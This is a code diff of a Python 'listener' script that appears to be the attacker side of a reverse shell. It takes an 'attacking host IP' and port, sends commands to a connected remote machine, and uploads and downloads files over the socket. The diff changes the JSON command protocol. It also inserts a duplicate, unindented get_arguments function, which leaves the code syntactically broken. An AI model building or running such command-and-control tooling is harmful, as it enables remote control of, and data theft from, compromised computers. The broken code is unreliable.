@@ -1,12 +1,9 @@
 #!/usr/bin/python3
-"""A simple listener script.
-   Uses Python 3.8"""
-
 import optparse
 import base64
 import socket
 import json
-
+import os
 
 
 
@@ -43,29 +40,27 @@ print(f"[+] Public IP: {public_ip}")
 local_ip = socket.gethostbyname(socket.gethostname())
 print(f"[+] Local IP: {local_ip}")
 
+def get_arguments():
+"""Get user supplied arguments from terminal."""
+parser = optparse.OptionParser()
+
+
 
 
 
 
 def get_arguments():
-    """Get user supplied arguments from terminal."""
     parser = optparse.OptionParser()
-
-    # arguments
     parser.add_option('-l', '--local', dest='local_ip', help='Attacking host IP.')
     parser.add_option('-p', '--port', dest='port', type="int", help='Port to connect to.')
-
     (options, arguments) = parser.parse_args()
-
     return options
-
 
 options = get_arguments()
 
 if not options.local_ip or not options.port:
     print("[-] Please provide -l <IP> and -p <PORT>")
     exit()
-
 
 class Listener:
     def __init__(self, local_ip, port):
@@ -85,15 +80,15 @@ class Listener:
         json_data = b''
         while True:
             try:
-                json_data += self.connection.recv(1024)
-                return json.loads(json_data)
+                json_data += self.connection.recv(4096)
+                return json.loads(json_data.decode())
             except ValueError:
                 continue
 
     def execute_remotely(self, command):
-        self.reliable_send(command)
+        self.reliable_send({"cmd": command})
 
-        if command[0] == 'exit':
+        if command == 'exit':
             self.connection.close()
             exit()
 
@@ -111,19 +106,20 @@ class Listener:
     def run(self):
         while True:
             command = input('>> ')
-            command = command.split(' ')
 
-            if command[0] == 'upload':
-                file_content = self.read_file(command[1])
-                command.append(file_content)
+            if command.startswith('upload '):
+                file_path = command.split(' ')[1]
+                file_content = self.read_file(file_path)
+                command = f"upload {file_path} {file_content}"
 
             result = self.execute_remotely(command)
 
-            if command[0] == 'download' and '[-] Error' not in result:
-                result = self.write_file(command[1], result)
-
-            print(result)
-
+            if command.startswith('download ') and result.get("status") == "ok":
+                path = command.split(' ')[1]
+                self.write_file(path, result.get("data"))
+                print("[+] Download complete")
+            else:
+                print(result.get("output"))
 
 my_listener = Listener(options.local_ip, options.port)
 my_listener.run()
